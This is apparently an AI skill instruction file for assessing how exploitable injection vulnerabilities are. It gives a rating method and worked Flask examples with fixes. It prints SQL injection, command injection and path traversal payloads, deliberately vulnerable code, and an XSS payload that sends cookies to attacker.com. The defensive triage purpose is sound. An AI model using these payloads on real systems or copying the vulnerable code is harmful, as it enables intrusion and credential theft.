---
name: exploitability-analyzer
description: "Analyze detected vulnerabilities to assess realistic exploitability by examining control flow, input sources, sanitization logic, and execution context. Use when users need to: (1) Determine if a vulnerability is actually exploitable in practice, (2) Assess severity and impact of security issues, (3) Prioritize vulnerability remediation, (4) Understand attack vectors and exploitation conditions, (5) Generate exploitability reports with proof-of-concept scenarios. Focuses on injection vulnerabilities (SQL, command, XSS, path traversal, LDAP) with detailed analysis of reachability, controllability, sanitization, and impact."
---

# Exploitability Analyzer

Assess whether detected vulnerabilities are realistically exploitable.

## Overview

This skill analyzes security vulnerabilities to determine if they're actually exploitable in practice. It examines control flow to assess reachability, traces input sources to evaluate controllability, analyzes sanitization logic, and considers execution context to provide realistic exploitability assessments with severity ratings.

## How to Use

Provide:
1. **Vulnerable code**: The code containing the vulnerability
2. **Vulnerability type**: SQL injection, XSS, command injection, etc.
3. **Context**: Surrounding code, input sources, sanitization functions
4. **Environment** (optional): Execution privileges, security controls

The skill will analyze:
- **Reachability**: Can attackers reach the vulnerable code?
- **Controllability**: Can attackers control the vulnerable input?
- **Sanitization**: Is input properly sanitized?
- **Impact**: What damage can be caused?
- **Exploitability**: Overall assessment (Critical/High/Medium/Low/None)

## Analysis Workflow

### Step 1: Identify Vulnerability Type

Classify the vulnerability:
- SQL Injection
- Command Injection
- Cross-Site Scripting (XSS)
- Path Traversal
- LDAP Injection
- Other injection types

### Step 2: Trace Data Flow

Follow the data from source to sink:

**Source**: Where does the input originate?
- User input (query params, POST data, headers)
- Database values (second-order injection)
- Configuration files
- Environment variables
- Hardcoded values

**Transformations**: What happens to the input?
- Validation checks
- Sanitization functions
- Encoding/escaping
- String operations

**Sink**: Where is the input used dangerously?
- SQL query execution
- System command execution
- HTML rendering
- File system operations

### Step 3: Assess Reachability

**Question**: Can an attacker reach the vulnerable code path?

**Critical**: Public endpoint, no authentication
**High**: Authenticated endpoint, common user role
**Medium**: Requires specific conditions or privileges
**Low**: Admin-only, internal function, rare code path
**None**: Dead code, unreachable

### Step 4: Evaluate Controllability

**Question**: Can an attacker control the vulnerable input?

**High**: Direct user input (GET/POST parameters, headers)
**Medium**: Indirect control (database, config files)
**Low**: Derived values, heavily processed
**None**: Hardcoded, system-generated

### Step 5: Analyze Sanitization

**Question**: Is the input properly sanitized?

**None**: No sanitization, direct pass-through
**Weak**: Blacklist filtering, incomplete escaping
**Partial**: Some sanitization but bypassable
**Strong**: Whitelist validation, proper escaping, parameterization

### Step 6: Determine Impact

**Question**: What damage can an attacker cause?

**Critical**: Remote code execution, full system compromise
**High**: Data breach, privilege escalation, DoS
**Medium**: Limited data access, information disclosure
**Low**: Minor information leak, cosmetic issues

### Step 7: Calculate Exploitability

Combine factors to determine overall exploitability:

| Reachability | Controllability | Sanitization | Impact | Exploitability |
|--------------|-----------------|--------------|---------|----------------|
| High | High | None | Critical | **CRITICAL** |
| High | High | Weak | High | **HIGH** |
| High | High | Partial | Medium | **MEDIUM** |
| Medium | Medium | Strong | Low | **LOW** |
| Any | Any | Strong | Any | **NONE** |

## Example: SQL Injection (Critical)

**Vulnerable Code**:
```python
@app.route('/user')
def get_user():
    username = request.args.get('username')
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()
```

**Analysis**:

**1. Vulnerability Type**: SQL Injection

**2. Data Flow**:
- **Source**: `request.args.get('username')` - user-controlled query parameter
- **Transformations**: None - direct string formatting
- **Sink**: `cursor.execute(query)` - SQL execution

**3. Reachability**: **High**
- Public endpoint (`/user`)
- No authentication required
- Easily accessible via HTTP GET

**4. Controllability**: **High**
- Direct user input via query parameter
- Attacker has full control over `username` value
- No restrictions on input format

**5. Sanitization**: **None**
- No input validation
- No escaping or parameterization
- Direct string formatting with f-string
- SQL metacharacters not filtered

**6. Impact**: **Critical**
- Full database access possible
- Can extract all user data
- Potential for data modification/deletion
- May enable privilege escalation
- Possible RCE via stored procedures (database-dependent)

**7. Exploitability**: **CRITICAL**

**Proof-of-Concept**:
```
GET /user?username=' OR '1'='1' --
```

This bypasses authentication and returns all users.

**Advanced Exploit**:
```
GET /user?username=' UNION SELECT password FROM admin_users --
```

This extracts admin passwords.

**Remediation**:
```python
@app.route('/user')
def get_user():
    username = request.args.get('username')
    # Use parameterized query
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return cursor.fetchone()
```

## Example: Command Injection (High)

**Vulnerable Code**:
```python
@app.route('/ping')
def ping_host():
    host = request.form.get('host')
    if ';' in host or '|' in host:
        return "Invalid host"
    result = os.system(f"ping -c 4 {host}")
    return f"Ping result: {result}"
```

**Analysis**:

**1. Vulnerability Type**: Command Injection

**2. Data Flow**:
- **Source**: `request.form.get('host')` - user-controlled POST parameter
- **Transformations**: Blacklist check for `;` and `|`
- **Sink**: `os.system()` - shell command execution

**3. Reachability**: **High**
- Public endpoint
- POST request (slightly less accessible than GET)
- No authentication

**4. Controllability**: **High**
- Direct user input
- Attacker controls `host` parameter

**5. Sanitization**: **Weak**
- Blacklist filtering only checks `;` and `|`
- Incomplete - doesn't block `$()`, backticks, `&&`, `||`, newlines
- Easily bypassable

**6. Impact**: **Critical**
- Remote code execution
- Full system compromise possible
- Depends on execution privileges (web server user)

**7. Exploitability**: **HIGH** (not Critical due to weak sanitization that may deter casual attackers)

**Proof-of-Concept**:
```
POST /ping
host=$(whoami)
```

This executes `whoami` command.

**Advanced Exploit**:
```
POST /ping
host=127.0.0.1 && cat /etc/passwd
```

This reads sensitive files.

**Remediation**:
```python
import subprocess
import shlex

@app.route('/ping')
def ping_host():
    host = request.form.get('host')
    # Validate input with whitelist
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        return "Invalid host"
    # Use subprocess without shell
    result = subprocess.run(['ping', '-c', '4', host],
                          capture_output=True, text=True)
    return f"Ping result: {result.stdout}"
```

## Example: XSS (Medium)

**Vulnerable Code**:
```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = db.search(query)
    return render_template_string(f"""
        <h1>Search Results for: {query}</h1>
        <ul>
        {% for result in results %}
            <li>{{ result }}</li>
        {% endfor %}
        </ul>
    """, results=results)
```

**Analysis**:

**1. Vulnerability Type**: Cross-Site Scripting (XSS)

**2. Data Flow**:
- **Source**: `request.args.get('q')` - user-controlled query parameter
- **Transformations**: None
- **Sink**: `render_template_string()` - HTML rendering with f-string

**3. Reachability**: **High**
- Public search endpoint
- No authentication required

**4. Controllability**: **High**
- Direct user input via query parameter
- Attacker controls search query

**5. Sanitization**: **None**
- No HTML encoding
- Direct insertion into HTML via f-string
- Jinja2 auto-escaping bypassed by f-string

**6. Impact**: **High**
- Session hijacking (steal cookies)
- Phishing attacks
- Defacement
- Keylogging
- Limited by browser security (CSP, HTTPOnly cookies)

**7. Exploitability**: **MEDIUM** (assuming modern browser protections)

**Proof-of-Concept**:
```
GET /search?q=<script>alert(document.cookie)</script>
```

This executes JavaScript in victim's browser.

**Advanced Exploit**:
```
GET /search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

This exfiltrates session cookies.

**Remediation**:
```python
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = db.search(query)
    # Use proper template with auto-escaping
    return render_template('search.html',
                         query=escape(query),
                         results=results)
```

## Example: Path Traversal (Low)

**Vulnerable Code**:
```python
@app.route('/download')
@login_required  # Requires authentication
def download_file():
    filename = request.args.get('file')
    # Blacklist check
    if '..' in filename:
        return "Invalid filename"
    filepath = os.path.join('/var/www/uploads', filename)
    return send_file(filepath)
```

**Analysis**:

**1. Vulnerability Type**: Path Traversal

**2. Data Flow**:
- **Source**: `request.args.get('file')` - user-controlled
- **Transformations**: Blacklist check for `..`
- **Sink**: `send_file()` - file system access

**3. Reachability**: **Medium**
- Requires authentication (`@login_required`)
- Accessible to authenticated users
- Not public

**4. Controllability**: **High**
- Direct user input
- Attacker controls filename

**5. Sanitization**: **Weak**
- Blacklist only checks `..`
- Doesn't prevent absolute paths
- Bypassable with URL encoding or alternate representations

**6. Impact**: **Medium**
- Information disclosure
- Limited to files readable by web server user
- Cannot execute code directly
- Depends on file system permissions

**7. Exploitability**: **LOW** (authentication required + weak but present sanitization)

**Proof-of-Concept**:
```
GET /download?file=/etc/passwd
```

This may read sensitive files if absolute paths work.

**Bypass Attempt**:
```
GET /download?file=....//....//etc/passwd
```

This may bypass the `..` check.

**Remediation**:
```python
import os

@app.route('/download')
@login_required
def download_file():
    filename = request.args.get('file')
    # Whitelist validation
    if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
        return "Invalid filename"
    # Resolve and validate path
    base_dir = '/var/www/uploads'
    filepath = os.path.realpath(os.path.join(base_dir, filename))
    if not filepath.startswith(base_dir):
        return "Access denied"
    return send_file(filepath)
```

## Exploitability Rating Scale

### CRITICAL
- Reachable: Public, no auth
- Controllable: Direct user input
- Sanitization: None
- Impact: RCE, full compromise
- **Action**: Immediate fix required

### HIGH
- Reachable: Public or authenticated
- Controllable: Direct or indirect
- Sanitization: Weak or bypassable
- Impact: Data breach, privilege escalation
- **Action**: Fix urgently (within days)

### MEDIUM
- Reachable: Authenticated or conditional
- Controllable: Partial control
- Sanitization: Partial but incomplete
- Impact: Limited data access
- **Action**: Fix in next release

### LOW
- Reachable: Restricted access
- Controllable: Limited control
- Sanitization: Mostly effective
- Impact: Minor information leak
- **Action**: Fix when convenient

### NONE
- Strong sanitization present
- Not reachable by attackers
- No realistic exploitation path
- **Action**: No immediate action needed

## Report Format

For each vulnerability, provide:

```
VULNERABILITY: <Type> in <Location>

Location: <File:line or endpoint>
Vulnerability Type: <SQL Injection, XSS, etc.>

DATA FLOW:
Source: <Where input comes from>
Transformations: <What happens to input>
Sink: <Where input is used dangerously>

EXPLOITABILITY ASSESSMENT:
Reachability: <Critical/High/Medium/Low/None> - <Explanation>
Controllability: <High/Medium/Low/None> - <Explanation>
Sanitization: <None/Weak/Partial/Strong> - <Explanation>
Impact: <Critical/High/Medium/Low> - <Explanation>

OVERALL EXPLOITABILITY: <CRITICAL/HIGH/MEDIUM/LOW/NONE>

PROOF-OF-CONCEPT:
<Example exploit demonstrating the vulnerability>

IMPACT:
<Detailed description of potential damage>

REMEDIATION:
<Specific code fix or mitigation strategy>
```

## References

Detailed assessment criteria:

- **[assessment_criteria.md](references/assessment_criteria.md)**: Comprehensive exploitability assessment framework with matrices for each vulnerability type

Load this reference when:
- Need detailed criteria for specific vulnerability types
- Want to see exploitability matrices
- Need more examples of each assessment factor

## Tips

1. **Trace data flow completely**: Follow input from source to sink
2. **Don't assume sanitization works**: Test for bypasses
3. **Consider execution context**: Privileges matter for impact
4. **Check for defense in depth**: Multiple protections reduce exploitability
5. **Verify reachability**: Dead code isn't exploitable
6. **Test proof-of-concepts**: Confirm exploitability when possible
7. **Consider real-world constraints**: Authentication, rate limiting, monitoring
8. **Prioritize by exploitability**: Fix critical issues first
